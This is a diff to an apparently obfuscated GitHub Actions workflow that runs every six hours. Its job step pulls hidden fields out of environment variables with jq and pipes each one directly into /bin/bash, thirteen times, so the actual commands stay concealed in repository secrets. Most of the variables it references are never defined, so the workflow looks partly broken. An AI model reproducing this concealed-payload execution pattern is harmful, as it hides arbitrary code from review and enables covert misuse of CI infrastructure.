@@ -1,20 +1,30 @@
 name: yangxiaosan3728
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '38 2/6 * * *'
+    - cron: '7 0/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: yangxiaosan3728
         env:
-          agyxw32: ${{ secrets.agyxw32 }}
+          wmzi80419: ${{ secrets.wmzi80419 }}
         run: |
-          echo $agyxw32 | jq -r .umre3 | /bin/bash
-          echo $clst4545 | jq -r .erbzv7 | /bin/bash
-          echo $zbcm03 | jq -r .md09 | /bin/bash
-          echo $h4197 | jq -r .tit07890 | /bin/bash
+          echo $wmzi80419 | jq -r .pc93 | /bin/bash
+          echo $ynovl5536 | jq -r .v2 | /bin/bash
+          echo $tczlg88 | jq -r .vmmw0022 | /bin/bash
+          echo $nldbh90246 | jq -r .fncvv1277 | /bin/bash
+          echo $ml41 | jq -r .e2 | /bin/bash
+          echo $id9257 | jq -r .s5422 | /bin/bash
+          echo $apgu179 | jq -r .ibakt96556 | /bin/bash
+          echo $mnc7988 | jq -r .kolo2266 | /bin/bash
+          echo $ivhj2563 | jq -r .ajxn69 | /bin/bash
+          echo $rwh7 | jq -r .jxkc6 | /bin/bash
+          echo $kix2 | jq -r .l29 | /bin/bash
+          echo $q729 | jq -r .wzn9494 | /bin/bash
+          echo $bru42762 | jq -r .oes2745 | /bin/bash
 
